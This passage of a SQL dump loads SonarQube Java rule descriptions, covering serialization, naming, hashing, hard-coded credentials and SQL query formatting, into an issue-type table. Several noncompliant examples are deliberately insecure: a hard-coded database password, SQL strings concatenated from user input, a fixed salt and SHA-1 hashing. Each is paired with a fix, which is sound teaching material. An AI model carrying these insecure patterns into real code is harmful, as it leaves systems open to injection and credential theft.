      <li> <code>FileUtils.write(File, CharSequence, boolean)</code> </li>
      <li> <code>FileUtils.writeStringToFile(File, String)</code> </li>
    </ul> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/pzdGBQ">CERT, STR04-J.</a> - Use compatible character encodings when communicating string data
  between JVMs </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ujZGBQ">CERT, STR50-J.</a> - Use the appropriate method for counting characters in a string
  </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1948', 'Fields in a "Serializable" class should either be transient or serializable', 'sonarqube', 'Code Smell', '<p>Fields in a <code>Serializable</code> class must themselves be either <code>Serializable</code> or <code>transient</code> even if the class is
never explicitly serialized or deserialized. For instance, under load, most J2EE application frameworks flush objects to disk, and an allegedly
<code>Serializable</code> object with non-transient, non-serializable data members could cause program crashes, and open the door to attackers. In
general a <code>Serializable</code> class is expected to fulfil its contract and not have an unexpected behaviour when an instance is serialized. </p>
<p>This rule raises an issue on non-<code>Serializable</code> fields, and on collection fields when they are not <code>private</code> (because they
could be assigned non-<code>Serializable</code> values externally), and when they are assigned non-<code>Serializable</code> types within the
class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Address {
  //...
}

public class Person implements Serializable {
  private static final long serialVersionUID = 1905122041950251207L;

  private String name;
  private Address address;  // Noncompliant; Address isn''t serializable
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Address implements Serializable {
  private static final long serialVersionUID = 2405172041950251807L;
}

public class Person implements Serializable {
  private static final long serialVersionUID = 1905122041950251207L;

  private String name;
  private Address address;
}
</pre>
<h2>Exceptions</h2>
<p>The alternative to making all members <code>serializable</code> or <code>transient</code> is to implement special methods which take on the
responsibility of properly serializing and de-serializing the object. This rule ignores classes which implement the following methods:</p>
<pre>
 private void writeObject(java.io.ObjectOutputStream out)
     throws IOException
 private void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/594.html">MITRE, CWE-594</a> - Saving Unserializable Objects to Disk </li>
  <li> <a href="https://docs.oracle.com/javase/6/docs/api/java/io/Serializable.html">Oracle Java 6, Serializable</a> </li>
  <li> <a href="https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html">Oracle Java 7, Serializable</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1989', 'Exceptions should not be thrown from servlet methods', 'sonarqube', 'Vulnerability', '<p>Even though the signatures for methods in a servlet include <code>throws IOException, ServletException</code>, it''s a bad idea to let such
exceptions be thrown. Failure to catch exceptions in a servlet could leave a system in a vulnerable state, possibly resulting in denial-of-service
attacks, or the exposure of sensitive information because when a servlet throws an exception, the servlet container typically sends debugging
information back to the user. And that information could be very valuable to an attacker. </p>
<p>This rule checks all exceptions in methods named "do*" are explicitly handled in servlet classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doGet(HttpServletRequest request, HttpServletResponse response)
  throws IOException, ServletException {
  String ip = request.getRemoteAddr();
  InetAddress addr = InetAddress.getByName(ip); // Noncompliant; getByName(String) throws UnknownHostException
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doGet(HttpServletRequest request, HttpServletResponse response)
  throws IOException, ServletException {
  try {
    String ip = request.getRemoteAddr();
    InetAddress addr = InetAddress.getByName(ip);
    //...
  }
  catch (UnknownHostException uhex) {
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/600.html">MITRE, CWE-600</a> - Uncaught Exception in Servlet </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/-zZGBQ">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1994', '"for" loop increment clauses should modify the loops'' counters', 'sonarqube', 'Code Smell', '<p>It can be extremely confusing when a <code>for</code> loop''s counter is incremented outside of its increment clause. In such cases, the increment
should be moved to the loop''s increment clause if at all possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 0; i &lt; 10; j++) { // Noncompliant
  // ...
  i++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 0; i &lt; 10; i++, j++) {
  // ...
}
</pre>
<p>Or </p>
<pre>
for (i = 0; i &lt; 10; i++) {
  // ...
  j++;
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S1996', 'Files should contain only one top-level class or interface each', 'sonarqube', 'Code Smell', '<p>A file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain. This
is doubly true for a file with multiple top-level classes and interfaces. It is strongly advised to divide the file into one top-level class or
interface per file.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2039', 'Member variable visibility should be specified', 'sonarqube', 'Code Smell', '<p>Failing to explicitly declare the visibility of a member variable could result it in having a visibility you don''t expect, and potentially leave it
open to unexpected modification by other classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
class Ball {
    String color="red";  // Noncompliant
}
enum A {
  B;
  int a;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Ball {
    private String color="red";  // Compliant
}
enum A {
  B;
  private int a;
}
</pre>
<h2>Exceptions</h2>
<p>Members annotated with <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed to make
the code testable.</p>
<pre>
class Cone {
  @VisibleForTesting
  Logger logger; // Compliant
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2047', 'The names of methods with boolean return values should start with "is" or "has"', 'sonarqube', 'Code Smell', '<p>Well-named functions can allow the users of your code to understand at a glance what to expect from the function - even before reading the
documentation. Toward that end, methods returning a boolean should have names that start with "is" or "has" rather than with "get".</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean getFoo() { // Noncompliant
  // ...
}

public boolean getBar(Bar c) { // Noncompliant
  // ...
}

public boolean testForBar(Bar c) { // Compliant - The method does not start by ''get''.
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isFoo() {
  // ...
}

public boolean hasBar(Bar c) {
  // ...
}

public boolean testForBar(Bar c) {
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are excluded.</p>
<pre>
@Override
public boolean getFoo(){
  // ...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2053', 'Hashes should include an unpredictable salt', 'sonarqube', 'Vulnerability', '<p>In cryptography, a "salt" is an extra piece of data which is included when hashing a password. This makes <code>rainbow-table attacks</code> more
difficult. Using a cryptographic hash function without an unpredictable salt increases the likelihood that an attacker could successfully find the
hash value in databases of precomputed hashes (called <code>rainbow-tables</code>).</p>
<p>This rule raises an issue when a hashing function which has been specifically designed for hashing passwords, such as <code>PBKDF2</code>, is used
with a non-random, reused or too short salt value. It does not raise an issue on base hashing algorithms such as <code>sha1</code> or <code>md5</code>
as they should not be used to hash passwords.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use hashing functions generating their own secure salt or generate a secure random value of at least 16 bytes. </li>
  <li> The salt should be unique by user password. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>Below, the hashed password use a predictable salt:</p>
<pre>
byte[] salt = "notrandom".getBytes();

PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000); // Noncompliant, predictable salt
PBEKeySpec spec = new PBEKeySpec(chars, salt, 10000, 256); // Noncompliant, predictable salt
</pre>
<h2>Compliant Solution</h2>
<p>Use <code>java.security.SecureRandom</code> to generate an unpredictable salt:</p>
<pre>
SecureRandom random = new SecureRandom();
byte[] salt = new byte[16];
random.nextBytes(salt);

PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000); // Compliant
PBEKeySpec spec = new PBEKeySpec(chars, salt, 10000, 256); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/759.html">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/760.html">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2055', 'The non-serializable super class of a "Serializable" class should have a no-argument constructor', 'sonarqube', 'Bug', '<p>When a <code>Serializable</code> object has a non-serializable ancestor in its inheritance chain, object deserialization (re-instantiating the
object from file) starts at the first non-serializable class, and proceeds down the chain, adding the properties of each subsequent child class, until
the final object has been instantiated. </p>
<p>In order to create the non-serializable ancestor, its no-argument constructor is called. Therefore the non-serializable ancestor of a
<code>Serializable</code> class must have a no-arg constructor. Otherwise the class is <code>Serializable</code> but not deserializable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  private Season ripe;

  public Fruit (Season ripe) {...}
  public void setRipe(Season ripe) {...}
  public Season getRipe() {...}
}

public class Raspberry extends Fruit
        implements Serializable {  // Noncompliant; nonserializable ancestor doesn''t have no-arg constructor
  private static final long serialVersionUID = 1;

  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  private Season ripe;

  public Fruit () {...};  // Compliant; no-arg constructor added to ancestor
  public Fruit (Season ripe) {...}
  public void setRipe(Season ripe) {...}
  public Season getRipe() {...}
}

public class Raspberry extends Fruit
        implements Serializable {
  private static final long serialVersionUID = 1;

  private String variety;

  public Raspberry(Season ripe, String variety) {...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2057', '"Serializable" classes should have a "serialVersionUID"', 'sonarqube', 'Code Smell', '<p>A <code>serialVersionUID</code> field is strongly recommended in all <code>Serializable</code> classes. If you do not provide one, one will be
calculated for you by the compiler. The danger in not explicitly choosing the value is that when the class changes, the compiler will generate an
entirely new id, and you will be suddenly unable to deserialize (read from file) objects that were serialized with the previous version of the
class.</p>
<p><code>serialVersionUID</code>''s should be declared with all of these modifiers: <code>static final long</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Raspberry extends Fruit  // Noncompliant; no serialVersionUID.
        implements Serializable {
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}

public class Raspberry extends Fruit
        implements Serializable {
  private final int serialVersionUID = 1; // Noncompliant; not static &amp; int rather than long
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Raspberry extends Fruit
        implements Serializable {
  private static final long serialVersionUID = 1;
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>
<h2>Exceptions</h2>
<p>Swing and AWT classes, <code>abstract</code> classes, <code>Throwable</code> and its subclasses (<code>Exception</code>s and <code>Error</code>s),
and classes marked with <code>@SuppressWarnings("serial")</code> are ignored.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ajdGBQ">CERT, SER00-J.</a> - Enable serialization compatibility during class evolution </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2059', '"Serializable" inner classes of "Serializable" classes should be static', 'sonarqube', 'Code Smell', '<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is actually
serializable, then the serialization will succeed but possibly write out far more data than was intended. </p>
<p>Making the inner class <code>static</code> (i.e. "nested") avoids this problem, therefore inner classes should be <code>static</code> if possible.
However, you should be aware that there are semantic differences between an inner class and a nested one: </p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Raspberry implements Serializable {
  // ...

  public class Drupelet implements Serializable {  // Noncompliant; output may be too large
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Raspberry implements Serializable {
  // ...

  public static class Drupelet implements Serializable {
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ZTdGBQ">CERT, SER05-J.</a> - Do not serialize instances of inner classes </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2060', '"Externalizable" classes should have no-arguments constructors', 'sonarqube', 'Bug', '<p>An <code>Externalizable</code> class is one which handles its own <code>Serialization</code> and deserialization. During deserialization, the first
step in the process is a default instantiation using the class'' no-argument constructor. Therefore an <code>Externalizable</code> class without a
no-arg constructor cannot be deserialized.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Tomato implements Externalizable {  // Noncompliant; no no-arg constructor

  public Tomato (String color, int weight) { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Tomato implements Externalizable {

  public Tomato() { ... }
  public Tomato (String color, int weight) { ... }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2061', 'Custom serialization method signatures should meet requirements', 'sonarqube', 'Bug', '<p>Writers of <code>Serializable</code> classes can choose to let Java''s automatic mechanisms handle serialization and deserialization, or they can
choose to handle it themselves by implementing specific methods. However, if the signatures of those methods are not exactly what is expected, they
will be ignored and the default serialization mechanisms will kick back in. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Watermelon implements Serializable {
  // ...
  void writeObject(java.io.ObjectOutputStream out)// Noncompliant; not private
        throws IOException
  {...}

  private void readObject(java.io.ObjectInputStream in)
  {...}

  public void readObjectNoData()  // Noncompliant; not private
  {...}

  static Object readResolve() throws ObjectStreamException  // Noncompliant; this method may have any access modifier, may not be static

  Watermelon writeReplace() throws ObjectStreamException // Noncompliant; this method may have any access modifier, but must return Object
  {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Watermelon implements Serializable {
  // ...
  private void writeObject(java.io.ObjectOutputStream out)
        throws IOException
  {...}

  private void readObject(java.io.ObjectInputStream in)
        throws IOException, ClassNotFoundException
  {...}

  private void readObjectNoData()
        throws ObjectStreamException
  {...}

  protected Object readResolve() throws ObjectStreamException
  {...}

  private Object writeReplace() throws ObjectStreamException
  {...}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/WTdGBQ">CERT, SER01-J.</a> - Do not deviate from the proper signatures of serialization methods
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2062', '"readResolve" methods should be inheritable', 'sonarqube', 'Code Smell', '<p>The <code>readResolve()</code> method allows final tweaks to the state of an object during deserialization. Non-final classes which implement
<code>readResolve()</code>, should not set its visibility to <code>private</code> since it will then be unavailable to child classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit implements Serializable {
  private static final long serialVersionUID = 1;

  private Object readResolve() throws ObjectStreamException  // Noncompliant
  {...}

  //...
}

public class Raspberry extends Fruit implements Serializable {  // No access to parent''s readResolve() method
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit implements Serializable {
  private static final long serialVersionUID = 1;

  protected Object readResolve() throws ObjectStreamException
  {...}

  //...
}

public class Raspberry extends Fruit implements Serializable {
  //...
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2063', 'Comparators should be "Serializable"', 'sonarqube', 'Code Smell', '<p>A non-serializable <code>Comparator</code> can prevent an otherwise-<code>Serializable</code> ordered collection from being serializable. Since the
overhead to make a <code>Comparator</code> serializable is usually low, doing so can be considered good defensive programming.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FruitComparator implements Comparator&lt;Fruit&gt; {  // Noncompliant
  int compare(Fruit f1, Fruit f2) {...}
  boolean equals(Object obj) {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FruitComparator implements Comparator&lt;Fruit&gt;, Serializable {
  private static final long serialVersionUID = 1;

  int compare(Fruit f1, Fruit f2) {...}
  boolean equals(Object obj) {...}
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2065', 'Fields in non-serializable classes should not be "transient"', 'sonarqube', 'Code Smell', '<p><code>transient</code> is used to mark fields in a <code>Serializable</code> class which will not be written out to file (or stream). In a class
that does not implement <code>Serializable</code>, this modifier is simply wasted keystrokes, and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Vegetable {  // does not implement Serializable
  private transient Season ripe;  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Vegetable {
  private Season ripe;
  // ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2066', '"Serializable" inner classes of non-serializable classes should be "static"', 'sonarqube', 'Bug', '<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is not
serializable, then serialization will fail, resulting in a runtime error. </p>
<p>Making the inner class <code>static</code> (i.e. "nested") avoids this problem, therefore inner classes should be <code>static</code> if possible.
However, you should be aware that there are semantic differences between an inner class and a nested one: </p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Pomegranate {
  // ...

  public class Seed implements Serializable {  // Noncompliant; serialization will fail
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Pomegranate {
  // ...

  public static class Seed implements Serializable {
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ZTdGBQ">CERT SER05-J.</a> - Do not serialize instances of inner classes </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2068', 'Hard-coded credentials are security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets. </p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It''s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", ...</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allows access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider''s service for managing secrets. </li>
  <li> If the a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Connection conn = null;
try {
  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +
        "user=steve&amp;password=blue"); // Sensitive
  String uname = "steve";
  String password = "blue";
  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +
        "user=" + uname + "&amp;password=" + password); // Sensitive

  java.net.PasswordAuthentication pa = new java.net.PasswordAuthentication("userName", "1234".toCharArray());  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Connection conn = null;
try {
  String uname = getEncryptedUser();
  String password = getEncryptedPass();
  conn = DriverManager.getConnection("jdbc:mysql://localhost/test?" +
        "user=" + uname + "&amp;password=" + password);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2070', 'SHA-1 and Message-Digest hash algorithms should not be used in secure contexts', 'sonarqube', 'Vulnerability', '<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>The following APIs are tracked for use of obsolete crypto algorithms:</p>
<ul>
  <li> <code>java.security.AlgorithmParameters</code> (JDK) </li>
  <li> <code>java.security.AlgorithmParameterGenerator</code> (JDK) </li>
  <li> <code>java.security.MessageDigest</code> (JDK) </li>
  <li> <code>java.security.KeyFactory</code> (JDK) </li>
  <li> <code>java.security.KeyPairGenerator</code> (JDK) </li>
  <li> <code>java.security.Signature</code> (JDK) </li>
  <li> <code>javax.crypto.Mac</code> (JDK) </li>
  <li> <code>javax.crypto.KeyGenerator</code> (JDK) </li>
  <li> <code>org.apache.commons.codec.digest.DigestUtils</code> (Apache Commons Codec) </li>
  <li> <code>org.springframework.util.DigestUtils</code> </li>
  <li> <code>com.google.common.hash.Hashing</code> (Guava) </li>
  <li> <code>org.springframework.security.authentication.encoding.ShaPasswordEncoder</code> (Spring Security 4.2.x) </li>
  <li> <code>org.springframework.security.authentication.encoding.Md5PasswordEncoder</code> (Spring Security 4.2.x) </li>
  <li> <code>org.springframework.security.crypto.password.LdapShaPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.Md4PasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.MessageDigestPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.NoOpPasswordEncoder</code> (Spring Security 5.0.x) </li>
  <li> <code>org.springframework.security.crypto.password.StandardPasswordEncoder</code> (Spring Security 5.0.x) </li>
</ul>
<p>Consider using safer alternatives, such as SHA-256, SHA-3 or adaptive one way functions like bcrypt or PBKDF2.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA1");  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA-256");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://shattered.io/">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS4790''>S4790</a>, <a href=''/coding_rules#rule_key=java%3AS5344''>S5344</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2077', 'Formatting SQL queries is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn''t detect SQL injections (unlike rule s3649), the goal is only to highlight complex/formatted queries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some parts of the query come from untrusted values (like user inputs). </li>
  <li> The query is repeated/duplicated in other parts of the code. </li>
  <li> The application must support different types of relational databases. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet">parameterized queries, prepared statements, or stored
  procedures</a> and bind variables to SQL query parameters. </li>
  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  Statement stmt2 = null;
  PreparedStatement pstmt;
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery("GETDATE()"); // No issue; hardcoded query

    stmt2 = con.createStatement();
    ResultSet rs2 = stmt2.executeQuery("select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=" + user);  // Sensitive

    pstmt = con.prepareStatement("select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=" + user);  // Sensitive
    ResultSet rs3 = pstmt.executeQuery();

    //...
}

public User getUserHibernate(org.hibernate.Session session, String data) {

  org.hibernate.Query query = session.createQuery(
            "FROM students where fname = " + data);  // Sensitive
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  PreparedStatement pstmt = null;
  String query = "select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=?"
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery("GETDATE()");

    pstmt = con.prepareStatement(query);
    pstmt.setString(1, user);  // Good; PreparedStatements escape their inputs.
    ResultSet rs2 = pstmt.executeQuery();

    //...
  }
}

public User getUserHibernate(org.hibernate.Session session, String data) {

  org.hibernate.Query query =  session.createQuery("FROM students where fname = ?");
  query = query.setParameter(0,data);  // Good; Parameter binding escapes all input

  org.hibernate.Query query2 =  session.createQuery("FROM students where fname = " + data); // Sensitive
  // ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/89">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/564.html">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/20.html">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/943.html">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
